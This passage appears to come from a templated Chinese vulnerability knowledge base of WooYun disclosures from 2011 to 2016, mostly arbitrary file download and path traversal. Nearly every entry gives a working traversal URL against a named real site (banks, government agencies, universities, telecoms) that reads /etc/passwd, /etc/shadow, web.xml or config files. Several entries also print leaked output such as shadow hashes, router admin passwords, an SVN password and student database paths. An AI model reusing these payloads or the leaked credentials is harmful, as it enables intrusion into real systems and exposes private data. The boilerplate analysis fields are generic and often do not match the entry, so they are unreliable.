**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: http://www.99jianzhu.com/down.php?file=/down.php下载任意文件数据库配置文件，备份数据库什么的都可以下载，别说登陆后台了另外二次开发的网站版本低

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0127987] EnableQ最新版任意文件下载一枚（需要登录）
**厂商**: 北京科维能动信息技术有限公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.enableq.com/enableq/WebAPI/Down.php?path=Li4vUGVyVXNlckRhdGEvLi4vQ29uZmlnLw==&file=Y29uZmlnLnBocA==path:这参数是表示文件路径的，../PerUserData/../Config/将这个路径base64加密后是file：这参数写需要下载的文件名,我们来下载config.php这个文件构造出最终地址http://www.enableq.com/enableq/WebAPI/Down.php?path=Li4vUGVyVXNlckRhdGEvLi4vQ29uZmlnLw==&file=Y29uZmlnLnBocA==

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0120714] 某敏感单位越权漏洞，任意邮件回复
**厂商**: 某敏感单位 | **年份**: 2015 | **类型**: 网络敏感信息泄漏

**元思考**: 触发信号: 功能测试

**洞察**: 网络敏感信息泄漏防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络敏感信息泄漏相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: .url：http://www.kfpolice.com/zdzxx/admin/mail/maillist.aspx目录遍历：url：http://www.kfpolice.com/zdzxx/

**POC**: url：http://www.kfpolice.com/zdzxx/admin/mail/maillist.aspx目录遍历：url：http://www.kfpolice.com/zdzxx/

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-033177] 美团网权限配置不当导致文件下载及后台暴露
**厂商**: 美团网 | **年份**: 2013 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 权限设置
---

---
### [wooyun-2011-03511] 阿里云·电商云任意文件下载漏洞
**厂商**: 阿里巴巴 | **年份**: 2011 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://ec.aliyun.com/picture?p=../.htaccesshttp://ec.aliyun.com/picture?p=../../../../cmis/web/dev_meeting/mail.php

**POC**: http://ec.aliyun.com/picture?p=../../../../../../../../../../../../../etc/passwdroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:1

**绕过**: 直接利用

**修复**: pw框架伪静态调用过滤，同服务器分站目录权限分离，内网数据库连接文件降权。
---

---
### [wooyun-2015-0108646] 中科新业网络哨兵任意文件下载/删除（2个）
**厂商**: 中科新业 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: /manage/include/downfile.php?gFileName=/etc/passwd/manage/stgl/download.php?filename=/etc/passwd造成漏洞的部分代码：if ( is_readable( $gFilePath.$gFileName ) ){echo $no_access_msg;exit( );}if ( file_exists( $gFilePath.$gFileName ) ){echo $not_find_file_msg;exit( );}$gFile = fopen( $gFilePath.$gFileName, "r" );header( "Content-Type: text/html; charset=utf-8" );header( "Content-type: application/octet-stream"

**POC**: https://219.134.131.240/manage/include/downfile.php?gFileName=/etc/passwdroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shu

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2014-055315] 中国联通某分站任意文件下载漏洞（某WebServer爆源码技巧）
**厂商**: 中国联通 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://edu.nmjxt.com/ 家校通平台--教育局端口   中国联通内蒙古分公司这个文件下载很特别，我也是第一次遇到..http://edu.nmjxt.com/login.asp::$DATAhttp://edu.nmjxt.com/index.asp::$DATAhttp://edu.nmjxt.com/conn.asp::$DATA直接访问路径后面加上::$DATA.就可以下载了、爽爆了配置文件：

**POC**: 配置文件：

**绕过**: 直接利用

**修复**: 你们懂的
---

---
### [wooyun-2013-025699] 一批中小银行任意文件下载
**厂商**: 一批中小银行 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 湖北银行：http://www.hubeibank.cn漏洞点：http://www.hubeibank.cn/download/download.jsp?filepath=/uploadfiles/yhjj/zygg/../../../../WEB-INF/web.xml&filename=web.xml攀枝花市商业银行：http://ebank.pzhccb.com漏洞点： http://ebank.pzhccb.com/download/download.jsp?filepath=/site323/uploadfiles/gncj/../../../../WEB-INF/web.xml&filename=web.xml抚顺银行：http://www.bankoffs.com.cn漏洞点： http://www.bankoffs.com.cn/download/download.jsp

**POC**: 湖北银行的web.xml

**绕过**: 直接利用

**修复**: 过滤../等敏感字符
---

---
### [wooyun-2015-0149036] 某证券公司网上营业厅任意文件下载
**厂商**: 中国五矿集团公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 五矿证券网上营业厅：https://i.wkzq.com.cn/未对f参数过滤，导致任意文件下载：https://i.wkzq.com.cn/page/common/download/down.down?f=../WEB-INF/web.xml日志信息：那么有什么用了。。。。。。并没有什么*用

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2014-069298] TRS WCM越权直接创建任意用户（无需审核）
**厂商**: 北京拓尔思信息技术股份有限公司 | **年份**: 2014 | **类型**: 非授权访问/权限绕过

**元思考**: 触发信号: 功能测试

**洞察**: 非授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别非授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、首先我们确定一个不存在或者密码错误的用户名：2、通过webservice调用创建用户的方法，创建一个用户：===============================在乌云找了找，WooYun: TRS系统任意文件下载漏洞中只发现一个存在该方法的案例http://wcm.xxz.gov.cn:8080/wcm/ 湘西州政府站群

**POC**: 成功登录新创建的用户：

**绕过**: 直接利用

**修复**: 对权限进行限制
---

---
### [wooyun-2014-072261] 鸡肋升级，高危利用第一弹#1 中央财经大学所有数据库泄露+数据库root密码泄露
**厂商**: www.cufe.edu.cn | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 安全是一个过程，任何心存侥幸的地方都不能忽视，所谓千里之提，溃于蚁穴。蚁穴所在处：http://www.cufe.edu.cn/cms/web/downloadFiles.jsp?file=鸡肋的任意文件下载，搜索了下发现之前有白帽子曾经提交过，但是厂商肯定觉得自己那么牛叉，就算/etc/passwd 和 /etc/shadow 被你们下载走了，你们也没什么用，所以赤裸裸的忽略了，连修复都懒得修复。看这里http://wooyun.org/bugs/wooyun-2010-065948好吧，那我就让你的大堤崩溃掉，这里只发崩溃地址，至于我是怎么挖掘的过程我就不写出来了，厂商你也不需要知道，只需要删除downloadFiles.jsp即可。#1 数据库配置账号密码泄露http://www.cufe.edu.cn/cms/web/downloadFiles.jsp?file=/home/cms

**POC**: 好了，厂商这次不给20rank真的对不起白帽子啊。

**绕过**: 直接利用

**修复**: 好了，厂商这次不给20rank真的对不起白帽子啊。
---

---
### [wooyun-2012-04669] CMS4J任意文件下载漏洞
**厂商**: cms4j | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.kunlunhealth.com/DownloadFile?type=full&file=/../../../../../../../../../etc/passwd涉及部分gov网站。。

**POC**: http://www.nndj.gov.cn/DownloadFile?type=full&file=/../../../../../../../../../../../etc/shadowhttp://www.hfjjzd.gov.cn:8080/DownloadFile?type=full&file=/index.jsp

**绕过**: 直接利用

**修复**: 过滤吧
---

---
### [wooyun-2013-036576] 阿里巴巴svn目录遍历存在大量子目录部分完整工程文件泄漏
**厂商**: 阿里巴巴 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://code.taobao.org，就是它了，登录什么的最烦人。http://code.taobao.org/svn，5364个子目录，资源库啊！！！！！！！！随便点进去一个，哇，密码都不要，任你查看！！各种源码，各种配置，亮瞎我的狗眼！

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 阿里的大牛们更懂。求审核通过，求乌云邀请码。。。。。。。。。。。。。。。。。。。
---

---
### [wooyun-2016-0183845] 中国银行某站任意文件读取/敏感信息泄漏(业务)
**厂商**: 中国银行 | **年份**: 2016 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 存在文件读取漏洞https://mentry.bocichina.com/resin-doc/examples/security-basic/viewfile?file=WEB-INF/password.xmlWEB-INF/password.xmlhttp://180.153.25.1/resin-doc/viewfile/?contextpath=/&servletpath=&file=index.jsp<!-- password.xml --><authenticator><!-- professors --><user name='snape' password='I7HdZr7CTM6hZLlSd2o+CA==' roles='professor,slytherin'/><user name='mcgonagall' password='4slsTREVeTo0sv5hGkZWa

**POC**: 3.64G内容丰富业务信息

**绕过**: 直接利用

**修复**: 你们懂！
---

---
### [wooyun-2015-0157746] 国兆电子科技某处任意文件读取漏洞
**厂商**: 国兆电子科技 | **年份**: 2015 | **类型**: 文件包含

**元思考**: 触发信号: 功能测试

**洞察**: 文件包含防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件包含相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**:1080/device/downExcelexample.action?fileName=../../../../../../../../../../etc/passwdroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12

**POC**: http://**.**.**.**:1080/device/downExcelexample.action?fileName=../../../../../../../../../../etc/passwd

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-028410] 速8酒店某处任意文件读取！
**厂商**: 速8酒店 | **年份**: 2013 | **类型**: 文件包含

**元思考**: 触发信号: 功能测试

**洞察**: 文件包含防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件包含相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://job.super8.com.cn/backend.php/interface/getdoc/?path=/../../../../etc/passwd

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 限制用户路径输入
---

---
### [wooyun-2014-085780] 圆通某内部系统目录遍历、且越权访问
**厂商**: 圆通 | **年份**: 2014 | **类型**: 网络未授权访问

**元思考**: 触发信号: 功能测试

**洞察**: 网络未授权访问防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络未授权访问相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://116.228.70.245:8088/it/ip/web/interactiveplatform/equipmentreport/ProcessReport/ER_SearchAllReport.aspx

**POC**: http://116.228.70.245:8088/it/ip/web/interactiveplatform/equipmentreport/ProcessReport/ER_SearchAllReport.aspx还有些直接暴露内部员工帐号、姓名以及联系方式等等 貌似都可以利用

**绕过**: 直接利用

**修复**: 你们更专业。。
---

---
### [wooyun-2015-0137978] 网龙旗下某业务任意文件下载ROOT权限可下载shadow
**厂商**: 福建网龙 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: http://121.207.243.133:8082/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/shadowroot:YnsI1kDIn0e9Q:16352:0:99999:7:::bin:*:15980:0:99999:7:::daemon:*:15980:0:99999:7:::adm:*:15980:0:99999:7:::lp:*:15980:0:99999:7:::sync:*:15980:0:99999:7:::shutdown:*:15980:0:99999:7:::halt:*:15980:

**绕过**: 直接利用

**修复**: 可能是接口调用的时候没做认证，
---

---
### [wooyun-2014-052704] 至顶网某站点任意文件读取导致敏感信息泄漏(截断技巧)
**厂商**: 至顶网 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://mail.zdnet.com.cn/html/login.php?Lang=invalid../../../../../../../../../../etc/passwd/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-067829] ZyNOS路由加密配置文件未授权下载可解密获取登录密码
**厂商**: ZyNOS | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 测试型号：ZyNOS Firmware Version:  V3.40 （貌似多款产品受影响）配置文件下载http://地址/rom-0案例：http://119.93.175.74/rom-0

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 。。
---

---
### [wooyun-2015-0164652] 通联支付某系统存在任意文件下载漏洞（可读shadow）
**厂商**: allinpay.com | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 无需登陆可下载https://113.108.182.3/aiap/other/download.dsr?file=/../../../../../../../../../etc/passwd

**POC**: https://113.108.182.3/aiap/other/download.dsr?file=/../../../../../../../../../etc/shadowhttps://113.108.182.3/aiap/other/download.dsr?file=/../../../../../../../../../etc/hosts

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2014-052737] 四川省经信委SQL注射&任意文件下载漏洞
**厂商**: 四川省经信委 | **年份**: 2014 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 功能测试

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 测试注入点：http://www.scjm.gov.cn:8080/gov/page/NewsQuery_n.jsp?ID=275明文密码呀：任意文件下载测试地址：http://www.scjm.gov.cn:8080/gov/page/download.jsp?file=../../gov/page/OB_NEW_SHOW.jsphttp://www.scjm.gov.cn:8080/gov/page/download.jsp?file=../../gov/page/hyxh.jsp

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2014-059308] 极影动漫网站备份文件下载
**厂商**: 极影动漫网 | **年份**: 2014 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 测试地址：http://bt.ktxp.com/db.rarhttp://bt.ktxp.com/pass.exehttp://bt.ktxp.com/wwwroot.ziphttp://bt.ktxp.com/backup.rar测试截图：

**POC**: 下载截图：

**绕过**: 直接利用

**修复**: 1、删除不必要文件。2、设置权限控制。
---

---
### [wooyun-2014-084465] 华汇人寿保险任意文件下载漏洞
**厂商**: 华汇人寿保险 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 华汇人寿保险股份有限公司下载网页参数filePath未过滤http://www.sciclife.com/manage/content/docmanage/download.jsp?filePath=/bxxz/renshenbaoxiantoubaotishishu.pdf下载download.jsp文件http://www.sciclife.com/manage/content/docmanage/download.jsp?filePath=/bxxz/../../content/docmanage/download.jsp下载passwd文件http://www.sciclife.com/manage/content/docmanage/download.jsp?filePath=/bxxz/../../../../../etc/passwd

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 过滤参数
---

---
### [wooyun-2012-012706] 福建省政府采购站 ColdfusionMX7遍历漏洞
**厂商**: 福建省政府采购办 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: coldfusion管理员界面存在目录遍历漏洞，适用于coldfusion6,7.8,9版本，可以遍历同一个分区下的文件，可能暴露系统敏感文件，coldfusion密码文件等

**POC**: http://www.ccgp-fujian.gov.cn/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../../../../../../../boot.ini%00en

**绕过**: 直接利用

**修复**: 建议升级服务器或者为CFIDE目录设置访问权限
---

---
### [wooyun-2013-021052] 中南大学任意文件下载漏洞
**厂商**: 中南大学信息科学与工程学院网站 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://sise.csu.edu.cn/newsDeal.do?method=downloadFile&path=../../../../../../../../../../../../etc/shadow

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 过滤客户端输入更改文件下载方式
---

---
### [wooyun-2013-036605] TOM某分站敏感信息泄漏ssh keygen
**厂商**: TOM在线 | **年份**: 2013 | **类型**: 内部绝密信息泄漏

**元思考**: 触发信号: 功能测试

**洞察**: 内部绝密信息泄漏防护不足，开发者信任前端输入

**测试流程**:
1. 识别内部绝密信息泄漏相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: TOM分站目录遍历 http://www.beta.ulechina.tom.com/Key泄漏地址：http://www.beta.ulechina.tom.com/yummi_beta/.ssh/authorized_keysssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA07Ko9MoZx9Kn6Zt8OAyqlfsRV0WrMorAikg7Twijzip9AZ2rCU24xxn0MJtkSaE5ljL7P5J9fAJXiPivbprd3vDA9gfDKPYkXFTigf3tg1gmorf1/VN/PuKWZe3j7Go3ALpG2t7p2ycdhvBzZ/OcLZi2ZASW2RSXPH+/Y9fGxZXhn0gdvBkD0fBvEo7+h+R3ZcDnykLQOfCig1WF6LSOmRXJorBY/mmpIgdq/Bfdjz97KuVfOBC3qzGzt

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 遍历目录禁了吧。
---

---
### [wooyun-2016-0198055] 中国联通WLAN某站目录遍历漏洞泄露多个管理平台登录口令（可远程控制大量夜店路由器）
**厂商**: 中国联通 | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**/apache服务器配置问题下载UniFi_Status.tar.gz解压后发现大量系统密码<?php/*** Created by PhpStorm.* User: tru2dagame* Date: 15/2/11* Time: 下午6:49*/date_default_timezone_set('PRC');set_time_limit(0);$config = array(/*array('server' => "**.**.**.**:8443",'username' => "admin",'password' => "unicom3824",'version' => 'v3',),array('server' => "**.**.**.**:8443",'username' => "admin",'password' => "unicom38

**POC**: 夜店1夜店 2夜店3各种夜店

**绕过**: 直接利用

**修复**: 修改Apache服务器权限
---

---
### [wooyun-2015-089431] 大汉网络JCMS任意文件下载
**厂商**: 南京大汉网络有限公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞Url：/jcms/m_5_e/module/voting/down.jsp?filename=a.txt&pathfile=/etc/passwd下载文件：root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/

**POC**: 案例：http://aid.ec.js.edu.cn/http://www.zjb.org.cn/http://122.224.183.4/http://ghj.anxiang.gov.cn/http://www.tianyige.com.cn/

**绕过**: 直接利用

**修复**: 严格限制文件名称
---

---
### [wooyun-2016-0192672] OASIS GAMES 全球最大的多语言多地区游戏平台任意文件读取（香港地區）
**厂商**: 香港绿洲游戏网络科技有限公司 | **年份**: 2016 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: #passwdhttp://**.**.**.**/delay_loader.php?d=d&file=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd

**POC**: root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mai

**绕过**: 直接利用

**修复**: 我是来找礼物的...
---

---
### [wooyun-2015-0141764] 银泰集团某站任意文件读取漏洞
**厂商**: 银泰商业集团 | **年份**: 2015 | **类型**: 文件包含

**元思考**: 触发信号: 功能测试

**洞察**: 文件包含防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件包含相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.intime.com.cn:8000/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/windows/win.ini

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 权限、过滤
---

---
### [wooyun-2014-068614] 某人力资源系统多处SQL注射/目录遍历/越权访问添加管理员（用户密码明文存储）
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: WooYun: 某人力资源系统任意文件下载(多家人力资源网存在问题)有人提交过了cncert国家互联网应急中心确认厂商为浙江天正思维信息技术有限公司（www.zjtzsw.com）注入点#1: google搜索 CompanyAction.do?userid影响案例：http://www.dqlm.com/CompanyAction.do?method=getpersoninfo&userid=P9797&psempid=P9797http://www.lhrlzyw.com/CompanyAction.do?method=getpersoninfo&userid=P16472&psempid=P16472http://220.176.122.18:9090/CompanyAction.do?method=getpersoninfo&userid=P3648&psempid=P3648ht

**POC**: 多处目录遍历：/include//company//news//images//upload/admin/edit//reg//admin/images//FCKeditor//admin/user/主要说说/admin/user/目录，该目录未授权访问，可以随意添加内部用户，赋予管理员权限如：http://www.dqlm.com/admin/user/http://www.lhrlzyw.com/admin/user/http://www.lhjy.gov.cn/admin/user/http://www.zjdeqing.lm.gov.cn/admin/user/http://www.f

**绕过**: 直接利用

**修复**: 可以脱裤了都，尽快处理通报涉及网站，这系统问题很多。
---

---
### [wooyun-2015-0101652] 标准化信息网任意文件下载导致工业与信息化标准网多站点安全问题
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 后台管理

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.gjb.com.cn/actionServer.php?action=downfile&fname=../index.php&ei=3kQGVe6qC4WAzAPZwYG4CQ&usg=AFQjCNH2QPP-ZmMTHmJtWQtCXVUyViUNAQ&bvm=bv.88198703,d.bGQ&cad=rjt任意文件下载， 导致后台地址暴露，数据库账号密码泄露，多站点后台统一口令。http://www.cape.com.cn/ecshop/admin/index.phphttp://www.cape.com.cn/capemanage/index.phphttp://cata.cape.com.cn/dede/login.phphttp://zbbz.cape.com.cn:8080/

**POC**: http://www.gjb.com.cn/actionServer.php?action=downfile&fname=../actionServer.php&ei=3kQGVe6qC4WAzAPZwYG4CQ&usg=AFQjCNH2QPP-ZmMTHmJtWQtCXVUyViUNAQ&bvm=bv.88198703,d.bGQ&cad=rjt通过代码分析获得后台路径：http://www.gjb.com.cn/bzzx/index.php程序漏洞很多，基本都没过滤参数，万能密码：$admin_name=$_POST["admin_name"];//hmy20141114if(!empty

**绕过**: 直接利用

**修复**: 第一个站点问题太多了，各种注入，重写吧。后台密码太简单,服务器权限配置，数据库用低权限账号
---

---
### [wooyun-2015-0139502] 哈尔滨商业大学本科生招商信息网目录遍历 ，可浏览758名考生身份信息
**厂商**: 哈尔滨商业大学 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 哈尔滨商业大学本科生招商信息网：http://zsb.hrbcu.edu.cn目录浏览：http://zsb.hrbcu.edu.cn/xsc数据库备份地址：http://zsb.hrbcu.edu.cn/xsc/style/in_out%20%281%29.sql

**POC**: 考生号', '姓名', '身份证号', '专业名称

**绕过**: 直接利用

**修复**: 设置目录浏览权限备份文件另存
---

---
### [wooyun-2015-0109381] 格林豪泰酒店某处运维不当导致大量用户备份数据泄漏
**厂商**: 格林豪泰酒店管理集团 | **年份**: 2015 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞网站：http://101.227.68.201:8111/通过 http://101.227.68.201:8099/http://101.227.68.201:8099/Login.aspx可证明是格林业务。目录遍历里面各种压缩包，甚至还有数据库文件。1.3G导入的时候报的错，请管理帮忙打码。

**POC**: 导入的时候报的错，请管理帮忙打码。

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-049636] TCL主站及分站svn导致源代码泄露
**厂商**: TCL官方网上商城 | **年份**: 2014 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.tcl.com/.svn/entrieshttp://multimedia.tcl.com/en/home/.svn/entriessvn 账号密码#!/bin/shexport LANG=en_US.UTF-8svn update /opt/lampp/htdocs/tcl  --username fantasy  --password al****23

